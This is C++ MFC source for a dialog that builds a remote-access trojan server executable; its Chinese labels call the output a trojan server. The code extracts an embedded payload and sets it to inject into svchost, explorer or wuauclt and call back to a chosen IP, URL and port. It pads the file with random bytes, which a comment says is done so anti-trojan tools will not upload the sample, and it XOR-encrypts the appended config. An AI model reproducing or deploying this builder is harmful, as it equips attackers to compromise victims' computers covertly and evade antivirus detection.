// CreateInjectServer.cpp : implementation file
//

#include "stdafx.h"
#include "CreateInjectServer.h"
#include "macro.h"
#include "conn.h"
#include "MasterService.h"

// CCreateInjectServer dialog

IMPLEMENT_DYNAMIC(CCreateInjectServer, CDialog)

CCreateInjectServer::CCreateInjectServer(CWnd* pParent /*=NULL*/)
	: CDialog(CCreateInjectServer::IDD, pParent)
{
	m_Port = _T("");
	m_URL = _T("");
	m_IsVip = FALSE;
}

CCreateInjectServer::~CCreateInjectServer()
{
}

void CCreateInjectServer::DoDataExchange(CDataExchange* pDX)
{
	DDX_Control(pDX, IDC_COMBO_IPLIST, m_IpList);
	DDX_Control(pDX, IDC_COMBO_CONN, m_ConnList);
	DDX_Control(pDX, IDC_COMBO_PROC, m_InjectList);

	DDX_Text(pDX, IDC_EDIT_PORT, m_Port);
	DDV_MaxChars(pDX, m_Port, 5);
	DDX_Text(pDX, IDC_EDIT_URL, m_URL);
	DDV_MaxChars(pDX, m_URL, 128);
	DDX_Radio(pDX, IDC_RADIO_VIP, m_IsVip);
}


BEGIN_MESSAGE_MAP(CCreateInjectServer, CDialog)
	ON_BN_CLICKED(IDC_BUTTON_CREATE, OnButtonCreate)
	ON_BN_CLICKED(IDC_RADIO_VIP, OnBnClickedRadioVip)
	ON_BN_CLICKED(IDC_RADIO_NOVIP, OnBnClickedRadioNovip)
END_MESSAGE_MAP()


BOOL CCreateInjectServer::OnInitDialog() 
{
	CDialog::OnInitDialog();

	char* iniFileName = PluginApp::GetCFGFile();
	char *p = 0;
	
	m_Port = "80";

	char m_sBakUrlName[256] = {0};
	GetPrivateProfileStringA("设置","URL", "", m_sBakUrlName, 255, iniFileName);
	m_URL = m_sBakUrlName;

	GetDlgItem(IDC_COMBO_IPLIST)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_PORT)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_URL)->EnableWindow(FALSE);

	UpdateData(FALSE);

	//取IP地址信息
	PHOSTENT hostinfo;
	char name[512] = {0};
	if(gethostname (name,sizeof(name)) != 0 ||
		(hostinfo = gethostbyname(name)) == NULL)
		return TRUE;

	struct sockaddr_in dest;
	for(int i=0; hostinfo->h_addr_list[i] != NULL ;i++)
	{
		memcpy(&(dest.sin_addr),  hostinfo->h_addr_list[i], hostinfo->h_length);
		m_IpList.AddString(inet_ntoa(dest.sin_addr));
	}
	m_IpList.SetCurSel(0);

	m_ConnList.AddString("UDP");
	m_ConnList.AddString("TCP");
	m_ConnList.AddString("HTTP");
	m_ConnList.SetCurSel(2);

	m_InjectList.SetCurSel(0);

	return TRUE;  
}
// CCreateInjectServer message handlers

void CCreateInjectServer::OnButtonCreate() 
{	
	CDialog::OnOK();

	char* iniFileName = PluginApp::GetCFGFile();
	char *p = 0;

	if(!m_URL.IsEmpty())
		WritePrivateProfileStringA("设置","URL", m_URL, iniFileName);
 
	union client_cfg cfg;
	memset(&cfg, 0, sizeof(cfg)); 
	strcpy((char*)&cfg, CFG_MAGIC);
	//strcpy((char*)cfg.cfg1.cmdModules, "execcmd|fileoperation|queryinfo|");
	if(m_IsVip)
	{
		strncpy(cfg.cfg1.clientIP, m_URL, sizeof(cfg.cfg1.clientIP));
		cfg.cfg1.port = 80;
		cfg.cfg1.conn_type = CONN_HTTP_CLIENT;
	}
	else
	{
		m_IpList.GetWindowText(cfg.cfg1.clientIP, sizeof(cfg.cfg1.clientIP));
		cfg.cfg1.port = atoi(m_Port);

		char connType[30] = {0};
		m_ConnList.GetWindowText(connType, 30);
		if(strcmp(connType, "HTTP") == 0)
			cfg.cfg1.conn_type = CONN_HTTP_CLIENT;
		else if(strcmp(connType, "TCP") == 0)
			cfg.cfg1.conn_type = CONN_TCP;
		else
			cfg.cfg1.conn_type = CONN_UDP1;

		//if(cfg.cfg1.port == 80 || cfg.cfg1.port == 8080 || cfg.cfg1.port == 3128)
		//	cfg.cfg1.conn_type = CONN_HTTP_CLIENT;
	}

	strcpy(cfg.cfg1.inject, "svchost");
	int rId = IDR_BINARY2;
	int idx = m_InjectList.GetCurSel();
	if(idx >= 0)
	{
		CString inject;
		m_InjectList.GetLBText(idx, inject);

		if(inject.Find("兼容") >= 0)
		{
			strcpy(cfg.cfg1.inject, "svchost");
			//strcpy(cfg.cfg1.inject, "local");
			rId = IDR_BINARY3;
		}

		if(inject.Find("资源管理器") >= 0)
			strcpy(cfg.cfg1.inject, "explorer");
		else if(inject.Find("自动更新") >= 0)
		{
			strcpy(cfg.cfg1.inject, "wuauclt");
			rId = IDR_BINARY1;
			strcat((char*)cfg.cfg1.cmdModules, "self|");
		}
	}

	KDebug("ip %s:%d type:%d inject:%s modules: %s", cfg.cfg1.clientIP, cfg.cfg1.port, 
		cfg.cfg1.conn_type, cfg.cfg1.inject, cfg.cfg1.cmdModules);

	HMODULE hModule = GetModuleHandleA(NULL);
	HRSRC hSrc = FindResourceA(NULL, MAKEINTRESOURCE(rId), "BINARY");	
	if(hSrc == NULL)	
	{
		KDebug("GetLastError(): %d", GetLastError());
		MessageBox("无法提取资源文件", "创建木马服务端", MB_OK|MB_ICONHAND);
		return;
	}

	HGLOBAL hRes = LoadResource(hModule, hSrc);
	ULONG size = SizeofResource(hModule, hSrc);

	char *pExe = new char[size];
	if (pExe == NULL)	return;

	p = (char*)LockResource(hRes);
	memcpy(pExe, p, size);
	FreeResource(hRes);

	CString szFileName;
	CFileDialog saveDialog(FALSE, "*.exe", "inject",  OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, "可执行文件(*.exe)|*.exe||");
	if (saveDialog.DoModal() != IDOK) return;
	szFileName = saveDialog.GetPathName();

	HANDLE hFile = CreateFileA(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		MessageBox(CString("不能创建文件") + szFileName, "创建木马服务端", MB_OK|MB_ICONHAND);
		delete [] pExe;
		return;
	}

	((MasterService*)g_Service)->OpenListenPort(
		cfg.cfg1.conn_type == CONN_HTTP_CLIENT ? CONN_HTTP_SERVER : cfg.cfg1.conn_type, 
		cfg.cfg1.port, true);

	DWORD nWrite;
	WriteFile(hFile, pExe, size, &nWrite, NULL);//写入PE文件

	//这里随机写入一些数据，使得木马文件体积增大到一定程度，这样反木马工具 不会上传样板
	srand(time(NULL));
	int patchSize = (rand() % 16 + 1) *16;
	for(int i = 0; i < patchSize; i++)
	{
		unsigned char bb[8] = {rand() % 256, rand() % 256, rand() % 256, rand() % 256,
			rand() % 256, rand() % 256, rand() % 256, rand() % 256};
		WriteFile(hFile,&bb, sizeof(bb), &nWrite, NULL);
	}
	
	//将配置信息写入PE文件末尾
	unsigned char* pp = (unsigned char*)&cfg;
	for (int i = sizeof(CFG_MAGIC); i < sizeof(cfg.cfg1); i++)
		pp[i] ^= 0xFF;		//加密配置信息
	WriteFile(hFile, &cfg, sizeof(cfg), &nWrite, NULL);
	
	CloseHandle(hFile);
	delete [] pExe;
}

void CCreateInjectServer::OnBnClickedRadioVip()
{
	GetDlgItem(IDC_COMBO_IPLIST)->EnableWindow(TRUE);
	GetDlgItem(IDC_COMBO_CONN)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_PORT)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_URL)->EnableWindow(FALSE);
}

void CCreateInjectServer::OnBnClickedRadioNovip()
{
	GetDlgItem(IDC_COMBO_IPLIST)->EnableWindow(FALSE);
	GetDlgItem(IDC_COMBO_CONN)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_PORT)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_URL)->EnableWindow(TRUE);
}